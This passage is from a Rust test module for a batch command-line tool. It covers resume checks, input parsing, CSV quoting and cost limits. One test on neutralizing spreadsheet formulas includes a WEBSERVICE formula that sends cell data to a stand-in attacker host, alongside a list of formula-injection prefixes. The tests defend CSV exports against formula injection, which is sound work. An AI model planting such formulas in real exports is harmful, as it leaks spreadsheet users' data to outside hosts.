            &["--max-total-cpt", "300", "--resume", "--cpu-score", "250"],
        )
        .await;
        let error = other_settings.result.unwrap_err().to_string();
        assert!(error.contains("settings differ"), "{error}");

        let other_replicas = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300", "--resume", "--replicas", "5"],
        )
        .await;
        assert!(other_replicas
            .result
            .unwrap_err()
            .to_string()
            .contains("settings differ"));

        let other_cap = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
            &[
                "--max-total-cpt",
                "300",
                "--resume",
                "--max-cpt-per-task",
                "500",
            ],
        )
        .await;
        assert!(other_cap
            .result
            .unwrap_err()
            .to_string()
            .contains("settings differ"));

        let other_skip = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300", "--resume", "--skip-invalid"],
        )
        .await;
        assert!(other_skip
            .result
            .unwrap_err()
            .to_string()
            .contains("settings differ"));

        // None of the refusals reached the network.
        assert_eq!(master.seen().len(), sent);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn resuming_without_a_saved_batch_is_refused() {
        let master = mock_master(5, &[]).await;
        let run = run_test_batch(
            &master,
            &[INPUT_25],
            &["--max-total-cpt", "300", "--resume"],
        )
        .await;
        let error = run.result.unwrap_err().to_string();
        assert!(error.contains("there is no state file"), "{error}");
        assert!(master.seen().is_empty());
    }

    #[tokio::test]
    async fn a_task_that_appeared_after_the_list_was_read_counts_as_submitted() {
        let master = mock_master(5, &[]).await;
        let dir = temp_batch_dir();
        master.fail_creates_after(Some(0));
        let first = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25],
            &["--max-total-cpt", "300"],
        )
        .await;
        assert!(first.csv.contains("t-0001,SUBMIT_FAILED"), "{}", first.csv);

        // The task is on the network by now, but the list the resume reads does not show it yet.
        master.fail_creates_after(None);
        {
            let mut state = master.state.lock().unwrap();
            state
                .tasks
                .insert("t-0001".to_owned(), "earlier".to_owned());
        }
        master.hide("t-0001");
        let second = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25],
            &["--max-total-cpt", "300", "--resume"],
        )
        .await;
        assert!(second.result.is_err());
        assert!(second.csv.contains("t-0001,SUBMITTED"), "{}", second.csv);
        assert!(!second.csv.contains("SUBMIT_FAILED"), "{}", second.csv);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn batch_inputs_are_one_compact_json_value_per_line() {
        let inputs = parse_batch_inputs("{\"value\": 1}\n\n  [2, 3]  \n7\n")
            .expect("valid lines should parse");
        assert_eq!(inputs, vec!["{\"value\":1}", "[2,3]", "7"]);

        let err = parse_batch_inputs("{\"value\": 1}\n{oops}\n")
            .expect_err("an invalid line must be reported with its number");
        assert!(err.to_string().contains("line 2"), "{err}");

        assert!(parse_batch_inputs("\n  \n").is_err());
    }

    #[test]
    fn batch_csv_quotes_only_fields_that_need_it() {
        assert_eq!(csv_field("plain"), "plain");
        assert_eq!(csv_field("a,b"), "\"a,b\"");
        assert_eq!(csv_field("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(csv_field("line\nbreak"), "\"line\nbreak\"");

        let rows = vec![BatchRow {
            index: 1,
            task_id: "sweep-0001".into(),
            input: "{\"values\":[1,2]}".into(),
            status: "COMPLETED".into(),
            output: "3".into(),
            billed_cpt: Some(42),
            message: String::new(),
        }];
        assert_eq!(
            render_batch_csv(&rows),
            format!(
                "{BATCH_RESULT_HEADER}\n1,sweep-0001,COMPLETED,3,42,,\"{{\"\"values\"\":[1,2]}}\"\n"
            )
        );
    }

    #[test]
    fn batch_csv_neutralizes_spreadsheet_formulas_and_leading_controls() {
        for value in [
            "=1+1",
            "+SUM(1,2)",
            "-1+2",
            "@SUM(A1:A2)",
            "\ttext",
            "\rtext",
            "\ntext",
            " \t\r\n=1+1",
            "\u{feff}=1+1",
            "\u{2003}+1",
            "\0@SUM(A1:A2)",
            "＝1+1",
            "＋1",
            "－1",
            "＠SUM(A1:A2)",
        ] {
            assert_eq!(
                csv_field(value),
                format!("\"'{}\"", value.replace('"', "\"\"")),
                "{value:?}"
            );
        }
        for value in [
            "",
            "plain",
            " leading space",
            "12",
            "value=1",
            "'already text",
        ] {
            assert_eq!(csv_field(value), value);
        }
    }

    #[test]
    fn batch_csv_neutralizes_task_outputs_and_messages_without_changing_results() {
        let formula = "=WEBSERVICE(\"https://attacker.invalid/collect?data=\"&ENCODEURL(G3))";
        let mut rows = vec![
            BatchRow {
                index: 1,
                task_id: "batch-0001".into(),
                input: "{}".into(),
                status: "PENDING".into(),
                output: String::new(),
                billed_cpt: None,
                message: String::new(),
            },
            BatchRow {
                index: 2,
                task_id: "batch-0002".into(),
                input: "{\"private\":\"value\"}".into(),
                status: "COMPLETED".into(),
                output: "ordinary result".into(),
                billed_cpt: Some(1),
                message: String::new(),
            },
        ];
        let snapshots = std::collections::HashMap::from([(
            "batch-0001".into(),
            serde_json::json!({
                "task_id": "batch-0001", "status": "COMPLETED", "output": formula,
                "billed_amount": 1, "status_message": "+1+1",
            }),
        )]);
        apply_batch_snapshots(&mut rows, &snapshots);
        assert_eq!(render_batch_csv(&rows), format!(
            "{BATCH_RESULT_HEADER}\n1,batch-0001,COMPLETED,\"'=WEBSERVICE(\"\"https://attacker.invalid/collect?data=\"\"&ENCODEURL(G3))\",1,\"'+1+1\",{{}}\n2,batch-0002,COMPLETED,ordinary result,1,,\"{{\"\"private\"\":\"\"value\"\"}}\"\n"
        ));
        assert_eq!(
            rows[0].output, formula,
            "only the CSV representation changes"
        );
        assert_eq!(rows[0].message, "+1+1");
    }

    #[test]
    fn batch_task_ids_and_worst_case_cost_are_checked() {
        assert_eq!(batch_task_id("sweep-1", 0), "sweep-1-0001");
        assert_eq!(batch_task_id("sweep-1", 999), "sweep-1-1000");
        assert!(is_safe_task_id(&batch_task_id("ok.prefix_2", 0)));

        assert_eq!(batch_worst_case_cpt(&[42, 42, 42]).unwrap(), 126);
        assert_eq!(batch_worst_case_cpt(&[82, 164]).unwrap(), 246);
        assert_eq!(batch_worst_case_cpt(&[]).unwrap(), 0);
        assert!(batch_worst_case_cpt(&[i64::MAX, 1]).is_err());

        assert_eq!(submit_interval(60), Duration::from_secs(1));
        assert_eq!(submit_interval(50), Duration::from_millis(1200));
        assert!(is_terminal_task_status("CANCELLED"));
        assert!(!is_terminal_task_status("RUNNING"));
    }

    #[test]
    fn batch_quote_carries_a_positive_budget_as_the_shared_checks_require() {
        let args: Vec<String> = [
            "hivemind",
            "batch",
            "sum.hcode",
            "--inputs",
            "inputs.jsonl",
            "--max-total-cpt",
            "10",
            "--username",
            "alice",
            "--password",
            "secret",
        ]
        .iter()
        .map(|value| value.to_string())
        .collect();
        let batch = match parse_cli_args(&args).expect("batch args should parse") {
            CliCommand::Batch(batch) => batch,
            other => panic!("expected a batch command, got {other:?}"),
        };

        let quote = batch_quote_body(&batch, "return 1;", "{}");
        assert_eq!(quote.get("max_cpt"), Some(&serde_json::json!(1)));
        assert_eq!(quote.get("runtime"), Some(&serde_json::json!("hcode")));
        assert_eq!(quote.get("torrent"), Some(&serde_json::json!("{}")));
    }
}
